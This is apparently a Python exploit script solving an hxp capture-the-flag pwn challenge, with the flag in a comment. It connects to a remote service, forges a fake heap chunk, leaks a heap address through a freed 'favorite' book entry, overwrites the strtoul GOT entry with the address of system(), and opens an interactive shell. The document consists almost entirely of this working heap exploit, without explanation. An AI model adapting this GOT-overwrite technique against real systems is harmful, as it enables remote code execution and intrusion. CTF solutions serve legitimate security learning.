from pwnlib import *


#hxp{5t0re_Y0uR_mu5iCz_2}

strtoul_got = 0x602070

LOCAL = False
if LOCAL:
	s = Socket(("localhost", 5553))
	system_offset = 0x46640
	strtoul_offset = 0x3d4c0
else:
	s = Socket(("130.211.206.204", 1340))
	strtoul_offset = 0x38f40
	system_offset = 0x41490


def add_book(title, thoughts, rating=1337):
	assert "\n" not in title
	assert "\n" not in thoughts
	s.send("a\n")
	s.ru("Title")
	s.send(title + "\n")
	s.ru(" 0 to 10:")
	s.send("%d\n" % rating)
	s.ru(" thoughts about the book")
	s.send(thoughts + "\n")
	return c()

def delete_book(n):
	s.send("%d\n" % n)
	c()
	s.send("d\n")
	return c()


def c():
	return s.ru("> ")

c()

fake_chunk = "0"*8
fake_chunk += pq(0x51)



add_book("AAAA", "AAAA")
add_book("BBBB", "BBBB")
add_book("CCCC", "CCCC", 0x51)
add_book(fake_chunk, "DDDD")
add_book("EEEE", "EEEE")

delete_book(3)

# make fav
s.send("0\n")
c()
s.send("f\n")
c()

# delete
s.send("1\n")
c()
s.send("d\n")

s.ru("Your favorite: ")
leaked = s.ru("\n  ")
c()

heap_addr = uq(leaked.ljust(8, chr(0)))
heap_base = heap_addr & ~0xfff

assert heap_addr & 0xfff == 0x140 

print "heap: 0x%x" % heap_addr


fake_chunk_addr = heap_base + 0x108

# edit -> corrupt
s.send("0\n")
c()
s.send("e\n")
s.ru("New title: ")
s.send(pq(fake_chunk_addr) + "\n")
s.ru("(0-10): ")
s.send("1\n")
s.ru("Revision: ")
s.send("yes\n")
c()


payload = "A"*8
payload += pq(strtoul_got)
payload = payload.rstrip("\x00")

fix = pq(heap_base + 0x30)
fix = fix.rstrip("\x00")


add_book("/bin/sh # 333333333", "4444")
leaked = add_book(payload, fix)

leaked = leaked.split("  1: ")[1].split("\n  2: ")[0]
leaked = uq(leaked.ljust(8, chr(0)))

system = leaked - strtoul_offset + system_offset

print "leaked: 0x%x" % leaked

s.send("1\n")
c()
s.send("e\n")


s.ru("New title: ")
s.send(pq(system) + "\n")
s.ru("(0-10): ")
s.send("sh\n")















s.interact()
